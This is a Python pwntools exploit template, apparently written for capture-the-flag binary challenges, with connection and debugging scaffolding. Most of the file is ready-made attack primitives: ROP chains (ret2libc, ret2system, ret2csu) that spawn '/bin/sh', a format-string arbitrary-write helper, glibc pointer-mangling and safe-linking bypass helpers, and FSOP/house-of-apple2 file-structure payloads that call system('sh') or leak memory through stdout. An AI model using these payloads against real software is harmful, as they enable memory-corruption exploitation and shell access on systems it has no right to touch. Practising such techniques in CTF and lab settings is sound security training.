#!/usr/bin/env python3
from pwn import *
from ctypes import CDLL
import time
from subprocess import Popen
from pwncli import IO_FILE_plus_struct

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
# libc = './libc.so.6'
# libc = ELF(libc, checksec=False)
# libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = "127.0.0.1", 5000


gdbscript = '''
init-gef
#set architecture aarch64
target remote :5000
c
'''.format(**locals())

def initialize(argv=[]):
    global pid
    if args.QEMU:
        if args.GDB:
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "./run"]).recvall().strip().decode()
        return p
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=False)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    else:
        return process([exe] + argv, aslr=False)

def debug():
    global gdbscript, pid
    if args.QEMU:
        gdb_args = ["tmux", "splitw", "-h", "-p", "65", "gdb"]
        for cmd in [item for line in gdbscript.strip().splitlines() if (item := line.strip())]:
            gdb_args.extend(["-ex", cmd])
        Popen(gdb_args)
    elif args.DOCKER:
        gdbscript = f'''
        init-pwndbg
        set sysroot /proc/{pid}/root
        c
        '''.format(**locals())        
        attach(int(pid), gdbscript=gdbscript, sysroot=f"/proc/{pid}/root", exe='chall')
    else:
        attach(io, gdbscript=gdbscript)


# =========================================================
#                         EXPLOITS
# =========================================================
# Stack
def onegadget():
    output = process(["one_gadget", "-r", libc.path]).recvline().decode().strip().split(" ")
    return [int(addr) for addr in output]

def ret2libc(got):
    rop = ROP(elf)
    rop.printf(got) # rop.puts(got)
    rop.raw(rop.ret.address)
    rop.main()
    return rop.chain()

def ret2system():
    rop = ROP(libc)
    rop.raw(rop.ret.address)
    rop.system(next(libc.search(b'/bin/sh')))
    return rop.chain()

def ret2csu():
    rop = ROP(elf)
    rop.call(elf.sym["__libc_csu_init"] + 90) #pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    rop.raw([0, 1, elf.sym["__init_array_start"], 0, 0, 0xcafebabe])
    rop.call(elf.sym["__libc_csu_init"] + 64) #mov rdx, rbx ; mov rsi, r14 mov edi, r13d ; call QWORD PTR [r12+rbx*8]
    rop.raw(0) # junk
    rop.raw([0, 0, 0, 0, 0, 0]) 
    return rop.chain()

# Fmstr
def www(where, what):
    offset = 12
    for i in range(len(what)):
        writes = {where + i:what[i]}
        input = fmtstr_payload(offset, writes, write_size='byte')
        io.sendline(input)

# Exit
rol = lambda val, r_bits, max_bits: \
    (val << r_bits % max_bits) & (2 ** max_bits - 1) | \
    ((val & (2 ** max_bits - 1)) >> (max_bits - (r_bits % max_bits)))

ror = lambda val, r_bits, max_bits: \
    ((val & (2 ** max_bits - 1)) >> r_bits % max_bits) | \
    (val << (max_bits - (r_bits % max_bits)) & (2 ** max_bits - 1))

encrypt = lambda value, key: rol(value ^ key, 0x11, 64)


# Heap Protection
def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def demangle(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

# FSOP
def fsrop(fp=libc.sym._IO_2_1_stdout_, offset=0):
    fs = FileStructure()
    fs.flags = b"  sh;".ljust(0x8,b"\x00")   
    fs._IO_read_end = fp
    fs._lock = fp+0x100
    fs._wide_data = fp - 0x10
    fs.unknown2 = p64(0)*3 + p64(1) + p64(libc.sym.system) + p64(fp + 0x60)
    fs.vtable = libc.sym._IO_wfile_jumps + offset
    return bytes(fs)

def stdout_leak(target=None, size=0x8):
    if target:
        return p64(0xfbad1800) + p64(0) * 3 + p64(target) + p64(target + size)
    else:
        return p64(0xfbad1800) + p64(0) * 3 + b'\x00'

def stdout_shell(exit=True):
    if exit:
        return IO_FILE_plus_struct().house_of_apple2_execmd_when_exit(libc.sym["_IO_2_1_stdout_"], libc.sym["_IO_wfile_jumps"], libc.sym["system"], "sh")[:0x100-1]
    else:
        return IO_FILE_plus_struct().house_of_apple2_execmd_when_do_IO_operation(libc.sym["_IO_2_1_stdout_"], libc.sym["_IO_wfile_jumps"], libc.sym["system"], "sh")[:0x100-1]

def exploit():
    global io
    io = initialize()
    offset = 0x100
    payload = flat({offset:[]}, filler=b"\x00")
    debug()
    log.info("ELF base address: %#x", elf.address)
    log.info("Libc base address: %#x", libc.address)
    io.interactive()

if __name__ == '__main__':
    exploit()
